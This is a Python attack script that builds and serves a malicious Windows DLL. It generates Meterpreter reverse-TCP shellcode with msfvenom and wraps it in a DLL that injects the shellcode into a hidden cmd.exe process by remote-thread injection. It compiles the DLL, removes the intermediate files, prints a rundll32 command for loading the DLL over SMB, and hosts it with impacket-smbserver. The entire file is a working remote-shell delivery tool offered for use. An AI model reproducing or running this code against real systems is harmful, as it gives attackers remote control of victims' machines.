#!/usr/bin/env python3
# Author: Lattice

import argparse
import random
import string
import subprocess
from termcolor import cprint,colored
parser = argparse.ArgumentParser(description='This script will launch a SMB Server hosting a staged reverse shell x64DLL file')

# Add arguments
parser.add_argument('-l', '--lhost',   type=str,   required=True , help="The Local Address")
parser.add_argument('-p', '--lport',   type=int,   required=True , help="The Local Port")
parser.add_argument('-s', '--share',   type=str,   required=False, help="The Share Name (OPTIONAL)")
parser.add_argument('-n', '--dll-name',type=str,   required=False, help="The DLL Name (OPTIONAL)")

args = parser.parse_args()

print(f"LHOST: {colored(f'{args.lhost}','green',attrs=['bold'])}")
print(f"LPORT: {colored(f'{args.lport}','green',attrs=['bold'])}")

# Create Random DLL or share name if not selected
if args.share:
    share_name = args.share
    print(f"SHARE: {colored(f'{share_name}','green',attrs=['bold'])}")
else:
    share_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5)) 
    print(f"SHARE: {colored(f'{share_name} (RANDOM)','green',attrs=['bold'])}")

if args.dll_name:
    dll_name = args.dll_name
    print(f"DLL NAME: {colored(f'{args.dll_name}\n','green',attrs=['bold'])}")
else:
    dll_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    print(f"DLL NAME: {colored(f'{dll_name} (RANDOM)\n','green',attrs=['bold'])}")


# Create Shellcode using MSFVENOM 
subprocess.run(f'msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={args.lport} -f c -o shell.c',shell=True,stderr=subprocess.DEVNULL)
with open("./shell.c","r") as shellcode:
    buf = shellcode.read()


# Create DLL using the shellcode 
with open("smb_delivery.c","w") as dll_code:
 dll_code.write(
f"""#include <windows.h>
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
	HANDLE hThread = NULL;
	LPVOID pAlloc = NULL;
	PROCESS_INFORMATION pi = {{ 0 }};
	STARTUPINFOW si = {{ 0 }};
	si.dwFlags = STARTF_USESHOWWINDOW;
    {buf}
	wchar_t cmd[] = L"cmd.exe";
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	SIZE_T paysize = sizeof(buf);
	switch (ul_reason_for_call)
    {{
	case DLL_PROCESS_ATTACH:
		pAlloc = VirtualAllocEx(pi.hProcess, NULL, paysize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(pi.hProcess, pAlloc, buf, paysize, NULL);
		hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAlloc, NULL, 0, NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}}


	return 0;
}}
"""
)

# Compile the dll
subprocess.run(f"x86_64-w64-mingw32-gcc -shared -o {dll_name}.dll smb_delivery.c",shell=True)
subprocess.run("rm -f ./smb_delivery.c ./shell.c",shell=True)

# Run and SMB server to host the dll
slash = '\\'
print(f"Run this command: {colored(f'rundll32.exe {slash+slash}{args.lhost}{slash}{share_name}{slash}{dll_name}.dll,0','red',attrs=['bold'])}")
subprocess.call(f"impacket-smbserver {share_name} .  -ip {args.lhost} -smb2support",shell=True)
